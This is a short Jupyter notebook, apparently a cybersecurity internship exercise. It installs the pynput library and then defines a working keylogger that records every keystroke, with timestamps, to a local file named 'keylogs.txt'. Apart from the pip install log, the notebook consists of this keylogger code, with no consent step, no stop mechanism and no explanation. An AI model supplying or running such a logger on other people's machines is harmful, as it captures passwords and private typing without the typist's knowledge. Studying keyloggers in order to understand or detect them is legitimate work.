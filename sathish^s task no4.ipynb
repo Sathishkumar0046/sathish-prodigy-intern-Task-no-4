{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "e5de0586-3866-441e-98cf-d4f457d6bf3d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting pynput\n",
      "  Downloading pynput-1.7.7-py2.py3-none-any.whl.metadata (31 kB)\n",
      "Requirement already satisfied: six in c:\\users\\sudarsan\\anaconda3\\lib\\site-packages (from pynput) (1.16.0)\n",
      "Downloading pynput-1.7.7-py2.py3-none-any.whl (90 kB)\n",
      "   ---------------------------------------- 0.0/90.2 kB ? eta -:--:--\n",
      "   ---------------------------------------- 0.0/90.2 kB ? eta -:--:--\n",
      "   ---------------------------------------- 0.0/90.2 kB ? eta -:--:--\n",
      "   ---------------------------------------- 0.0/90.2 kB ? eta -:--:--\n",
      "   ---------------------------------------- 0.0/90.2 kB ? eta -:--:--\n",
      "   ---------------------------------------- 0.0/90.2 kB ? eta -:--:--\n",
      "   ---------------------------------------- 0.0/90.2 kB ? eta -:--:--\n",
      "   ---------------------------------------- 0.0/90.2 kB ? eta -:--:--\n",
      "   ---------------------------------------- 0.0/90.2 kB ? eta -:--:--\n",
      "   ---------------------------------------- 0.0/90.2 kB ? eta -:--:--\n",
      "   ------------- -------------------------- 30.7/90.2 kB ? eta -:--:--\n",
      "   ------------------ --------------------- 41.0/90.2 kB 393.8 kB/s eta 0:00:01\n",
      "   ------------------ --------------------- 41.0/90.2 kB 393.8 kB/s eta 0:00:01\n",
      "   ------------------ --------------------- 41.0/90.2 kB 393.8 kB/s eta 0:00:01\n",
      "   ------------------ --------------------- 41.0/90.2 kB 393.8 kB/s eta 0:00:01\n",
      "   ------------------ --------------------- 41.0/90.2 kB 393.8 kB/s eta 0:00:01\n",
      "   ------------------ --------------------- 41.0/90.2 kB 393.8 kB/s eta 0:00:01\n",
      "   ------------------ --------------------- 41.0/90.2 kB 393.8 kB/s eta 0:00:01\n",
      "   ------------------ --------------------- 41.0/90.2 kB 393.8 kB/s eta 0:00:01\n",
      "   ------------------ --------------------- 41.0/90.2 kB 393.8 kB/s eta 0:00:01\n",
      "   ------------------ --------------------- 41.0/90.2 kB 393.8 kB/s eta 0:00:01\n",
      "   ---------------------------------------- 90.2/90.2 kB 155.3 kB/s eta 0:00:00\n",
      "Installing collected packages: pynput\n",
      "Successfully installed pynput-1.7.7\n"
     ]
    }
   ],
   "source": [
    "!pip install pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cd52a7b1-c3ae-4dba-82fd-0a790aadeb19",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import Key, Listener\n",
    "import logging\n",
    "\n",
    "# Set up logging to a file\n",
    "log_file = \"keylogs.txt\"\n",
    "logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')\n",
    "\n",
    "def on_press(key):\n",
    "    try:\n",
    "        logging.info(f'{key.char}')\n",
    "    except AttributeError:\n",
    "        logging.info(f'{key}')\n",
    "\n",
    "# Start the listener\n",
    "with Listener(on_press=on_press) as listener:\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "17c036cc-66b3-4889-bbf3-bb419cb2642a",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
